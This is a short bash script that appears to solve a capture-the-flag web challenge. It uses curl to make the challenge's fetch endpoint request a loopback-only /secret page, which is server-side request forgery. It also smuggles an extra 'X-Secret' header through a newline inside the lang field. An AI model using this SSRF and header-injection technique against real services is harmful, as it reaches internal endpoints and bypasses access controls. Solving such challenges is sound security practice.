#!/bin/bash

curl -v -d'url=http://127.0.0.1:5000/secret' -d'lang=en-US
X-Secret:YEAH' "http://challenges.gynvael.stream:5000/fetch"
